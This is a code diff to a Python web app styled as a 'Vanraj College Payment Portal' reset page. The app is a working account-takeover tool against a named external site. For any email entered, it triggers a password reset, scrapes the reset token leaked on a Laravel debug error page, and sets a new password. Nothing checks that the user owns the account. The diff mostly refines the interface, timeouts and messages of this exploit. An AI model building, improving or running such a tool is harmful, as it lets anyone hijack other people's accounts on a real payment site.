@@ -4,7 +4,7 @@ import re
 import requests
 from urllib.parse import parse_qs
 
-HTML = """<!DOCTYPE html>
+HTML = r"""<!DOCTYPE html>
 <html lang="hi">
 <head>
   <meta charset="UTF-8">
@@ -35,11 +35,12 @@ HTML = """<!DOCTYPE html>
       outline: none; border-color: var(--primary);
       box-shadow: 0 0 0 3px rgba(37,99,235,.15);
     }
-    .row { display: flex; gap: .5rem; margin-top: .5rem; }
-    .row input { flex: 1; }
+    input.filled { border-color: #22c55e; background: #f0fdf4; }
+    .row { display: flex; gap: .5rem; align-items: stretch; }
+    .row input { flex: 1; min-width: 0; }
     button {
-      padding: .75rem 1rem; background: var(--primary); color: #fff; border: none;
-      border-radius: var(--radius); font-size: .9rem; font-weight: 600; cursor: pointer;
+      padding: .7rem 1rem; background: var(--primary); color: #fff; border: none;
+      border-radius: var(--radius); font-size: .875rem; font-weight: 600; cursor: pointer;
       white-space: nowrap;
     }
     button:hover { background: var(--primary-hover); }
@@ -49,7 +50,7 @@ HTML = """<!DOCTYPE html>
     button.full { width: 100%; margin-top: 1.5rem; padding: .85rem; font-size: 1rem; }
     #result {
       display: none; margin-top: 1.25rem; padding: .85rem 1rem;
-      border-radius: var(--radius); font-size: .875rem; line-height: 1.45; word-break: break-all;
+      border-radius: var(--radius); font-size: .875rem; line-height: 1.5; word-break: break-all;
     }
     .ok  { background: #dcfce7; color: #166534; border: 1px solid #bbf7d0; }
     .err { background: #fee2e2; color: #991b1b; border: 1px solid #fecaca; }
@@ -65,60 +66,80 @@ HTML = """<!DOCTYPE html>
     <p class="sub">Vanraj College Payment Portal</p>
 
     <label for="email">Email Address</label>
-    <input id="email" type="email" placeholder="registered@email.com" autocomplete="email" required>
+    <input id="email" type="email" placeholder="registered@email.com" autocomplete="email">
 
     <label for="token">Reset Token</label>
     <div class="row">
-      <input id="token" type="text" placeholder="Auto-fill ya paste karo">
-      <button type="button" class="secondary" id="findBtn" onclick="findToken()">Find Token</button>
+      <input id="token" type="text" placeholder="Find Token se auto-fill">
+      <button type="button" class="secondary" id="findBtn">Find Token</button>
     </div>
 
     <label for="password">New Password</label>
-    <input id="password" type="password" placeholder="Naya password (min 6)" autocomplete="new-password" required>
+    <input id="password" type="password" placeholder="Naya password (min 6)" autocomplete="new-password">
 
-    <button class="full" id="btn" onclick="resetPassword()">Reset Password</button>
+    <button class="full" id="btn">Reset Password</button>
 
     <div id="result"></div>
 
     <div class="note">
-      <b>Find Token:</b> Email dalo → Find Token dabao → token auto-fill ho jayega.<br>
-      Yeh site ke debug leak pe depend karta hai. Mail system theek ho jaye to band ho sakta hai.
+      <b>Steps:</b> 1) Email dalo 2) Find Token (10-20 sec lag sakta hai) 3) Password dalo 4) Reset<br>
+      Hard refresh: Ctrl+Shift+R agar purana page dikhe.
     </div>
   </div>
   <script>
     const $ = id => document.getElementById(id);
+    const result = $('result');
 
-    function show(el, msg, ok) {
-      el.style.display = 'block';
-      el.className = ok ? 'ok' : 'err';
-      el.textContent = msg;
+    function show(msg, ok) {
+      result.style.display = 'block';
+      result.className = ok ? 'ok' : 'err';
+      result.textContent = msg;
     }
 
     async function findToken() {
       const email = $('email').value.trim();
       const btn = $('findBtn');
-      const result = $('result');
-      if (!email) return show(result, 'Pehle email dalo', false);
+      const tokenInput = $('token');
+
+      if (!email) {
+        show('Pehle email address dalo', false);
+        return;
+      }
 
       btn.disabled = true;
       btn.textContent = 'Finding...';
       result.style.display = 'none';
+      tokenInput.classList.remove('filled');
 
       try {
-        const res = await fetch(window.location.pathname || '/', {
+        const controller = new AbortController();
+        const timer = setTimeout(() => controller.abort(), 35000);
+
+        const res = await fetch('/', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ action: 'find_token', email })
+          body: JSON.stringify({ action: 'find_token', email: email }),
+          signal: controller.signal
         });
+        clearTimeout(timer);
+
         const data = await res.json();
-        if (data.success && data.token) {
-          $('token').value = data.token;
-          show(result, '✅ Token mil gaya! Ab naya password dalo aur Reset dabao.\n\n' + data.token, true);
+        console.log('find_token response', data);
+
+        if (data && data.success && data.token) {
+          tokenInput.value = data.token;
+          tokenInput.classList.add('filled');
+          tokenInput.focus();
+          show('Token mil gaya aur fill ho gaya! Ab naya password dalo aur Reset dabao.', true);
         } else {
-          show(result, data.message || 'Token nahi mila', false);
+          show((data && data.message) ? data.message : 'Token nahi mila', false);
         }
       } catch (err) {
-        show(result, 'Network error: ' + err.message, false);
+        if (err.name === 'AbortError') {
+          show('Timeout: server slow hai. Dobara Find Token try karo.', false);
+        } else {
+          show('Error: ' + err.message, false);
+        }
       }
 
       btn.disabled = false;
@@ -130,48 +151,55 @@ HTML = """<!DOCTYPE html>
       const token = $('token').value.trim();
       const password = $('password').value.trim();
       const btn = $('btn');
-      const result = $('result');
 
-      if (!email || !token || !password) return show(result, 'Sab fields bharna zaroori hai', false);
-      if (password.length < 6) return show(result, 'Password kam se kam 6 characters ka hona chahiye', false);
+      if (!email || !token || !password) {
+        show('Email, Token aur Password sab required hain', false);
+        return;
+      }
+      if (password.length < 6) {
+        show('Password kam se kam 6 characters ka hona chahiye', false);
+        return;
+      }
 
       btn.disabled = true;
       btn.textContent = 'Processing...';
       result.style.display = 'none';
 
       try {
-        const res = await fetch(window.location.pathname || '/', {
+        const res = await fetch('/', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ action: 'reset', email, token, password })
+          body: JSON.stringify({ action: 'reset', email: email, token: token, password: password })
         });
         const data = await res.json();
-        show(result, data.message, data.success);
+        show(data.message || (data.success ? 'Success' : 'Failed'), !!data.success);
       } catch (err) {
-        show(result, 'Network error: ' + err.message, false);
+        show('Error: ' + err.message, false);
       }
 
       btn.disabled = false;
       btn.textContent = 'Reset Password';
     }
 
-    document.addEventListener('keydown', e => {
+    $('findBtn').addEventListener('click', findToken);
+    $('btn').addEventListener('click', resetPassword);
+    document.addEventListener('keydown', function(e) {
       if (e.key === 'Enter') resetPassword();
     });
   </script>
 </body>
-</html>"""
+</html>
+"""
 
 
 def find_token(email: str):
-    """Request reset link and extract token from Laravel debug 500 page."""
     BASE_URL = "https://payment.vaccdharampur.org"
     session = requests.Session()
     session.headers.update({
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
     })
 
-    r = session.get(f"{BASE_URL}/password/reset", timeout=15)
+    r = session.get(f"{BASE_URL}/password/reset", timeout=20)
     if r.status_code != 200:
         return {"success": False, "message": f"Reset page open nahi hua ({r.status_code})"}
 
@@ -184,7 +212,7 @@ def find_token(email: str):
         f"{BASE_URL}/password/email",
         data={"_token": csrf, "email": email},
         headers={"Referer": f"{BASE_URL}/password/reset", "Origin": BASE_URL},
-        timeout=20,
+        timeout=25,
     )
 
     tokens = re.findall(r"password/reset/([a-f0-9]{60,})", post.text, re.I)
@@ -197,22 +225,16 @@ def find_token(email: str):
             "reset_url": f"{BASE_URL}/password/reset/{token}",
         }
 
-    # Fallback messages
     text_lower = post.text.lower()
-    if post.status_code == 200 and ("e-mailed" in text_lower or "sent" in text_lower):
-        return {
-            "success": False,
-            "message": "Mail bhej di gayi lagti hai, lekin debug page me token leak nahi hua. Inbox check karo.",
-        }
     if "no valid recipients" in text_lower or "swift_transport" in text_lower:
         return {
             "success": False,
-            "message": "SMTP error aaya lekin token leak nahi mila. Thodi der baad try karo.",
+            "message": "SMTP error aaya lekin token extract nahi hua. Dobara try karo.",
         }
 
     return {
         "success": False,
-        "message": f"Token nahi mila (HTTP {post.status_code}). Site debug mode band ho sakta hai.",
+        "message": f"Token nahi mila (HTTP {post.status_code}). Debug leak band ho sakta hai.",
     }
 
 
@@ -227,7 +249,7 @@ def reset_password(email: str, token: str, password: str):
     resp = session.get(reset_url, timeout=15)
 
     if resp.status_code != 200:
-        raise Exception(f"Reset page open nahi hua (Status: {resp.status_code}). Token expire/invalid ho sakta hai.")
+        raise Exception(f"Reset page open nahi hua ({resp.status_code}). Token expire/invalid.")
 
     csrf_token = None
     if 'name="_token"' in resp.text:
@@ -246,15 +268,10 @@ def reset_password(email: str, token: str, password: str):
         "password_confirmation": password,
     }
 
-    headers = {
-        "Referer": reset_url,
-        "Origin": BASE_URL,
-    }
-
     post_resp = session.post(
         f"{BASE_URL}/password/reset",
         data=payload,
-        headers=headers,
+        headers={"Referer": reset_url, "Origin": BASE_URL},
         allow_redirects=True,
         timeout=15,
     )
@@ -264,12 +281,11 @@ def reset_password(email: str, token: str, password: str):
 
     success = (
         "password has been reset" in text_lower
-        or "your password has been reset" in text_lower
         or final_url.endswith("/home")
-        or final_url.endswith("/dashboard")
         or "/home" in final_url
         or final_url.endswith("/login")
         or "/login" in final_url
+        or final_url.endswith("/dashboard")
     )
 
     if "/password/reset" in final_url and (
@@ -277,19 +293,14 @@ def reset_password(email: str, token: str, password: str):
     ):
         success = False
 
-    message = (
-        "✅ Password reset successful! Ab naye password se login karo."
-        if success
-        else "❌ Reset fail hua."
-    )
-
-    if not success:
-        if "we can't find a user with that e-mail address" in text_lower:
-            message = "❌ Is email se koi account nahi mila."
-        elif "token" in text_lower and ("invalid" in text_lower or "expired" in text_lower):
-            message = "❌ Reset token invalid ya expire ho gaya hai. Find Token se naya lo."
-        else:
-            message = f"❌ Reset fail hua. Final URL: {post_resp.url}"
+    if success:
+        message = "Password reset successful! Ab naye password se login karo."
+    elif "can't find a user" in text_lower:
+        message = "Is email se koi account nahi mila."
+    elif "token" in text_lower and ("invalid" in text_lower or "expired" in text_lower):
+        message = "Token invalid/expire. Find Token se naya lo."
+    else:
+        message = f"Reset fail. URL: {post_resp.url}"
 
     return {
         "success": success,
@@ -303,6 +314,7 @@ class handler(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
         self.send_header("Content-type", "text/html; charset=utf-8")
+        self.send_header("Cache-Control", "no-store")
         self.end_headers()
         self.wfile.write(HTML.encode("utf-8"))
 
@@ -316,19 +328,17 @@ class handler(BaseHTTPRequestHandler):
             data = parse_qs(body)
             data = {k: v[0] for k, v in data.items()}
 
-        action = data.get("action", "reset").strip()
-        email = data.get("email", "").strip()
+        action = (data.get("action") or "reset").strip()
+        email = (data.get("email") or "").strip()
 
         try:
             if action == "find_token":
                 if not email:
                     return self._json(400, {"success": False, "message": "Email required"})
-                result = find_token(email)
-                return self._json(200, result)
+                return self._json(200, find_token(email))
 
-            # default: reset
-            token = data.get("token", "").strip()
-            password = data.get("password", "").strip()
+            token = (data.get("token") or "").strip()
+            password = (data.get("password") or "").strip()
 
             if not email or not token or not password:
                 return self._json(400, {
@@ -336,8 +346,7 @@ class handler(BaseHTTPRequestHandler):
                     "message": "Email, Token aur Password sab required hain",
                 })
 
-            result = reset_password(email, token, password)
-            return self._json(200, result)
+            return self._json(200, reset_password(email, token, password))
 
         except Exception as e:
             return self._json(500, {"success": False, "message": f"Error: {str(e)}"})
@@ -353,5 +362,6 @@ class handler(BaseHTTPRequestHandler):
         self.send_response(status)
         self.send_header("Content-type", "application/json")
         self.send_header("Access-Control-Allow-Origin", "*")
+        self.send_header("Cache-Control", "no-store")
         self.end_headers()
         self.wfile.write(json.dumps(data).encode())
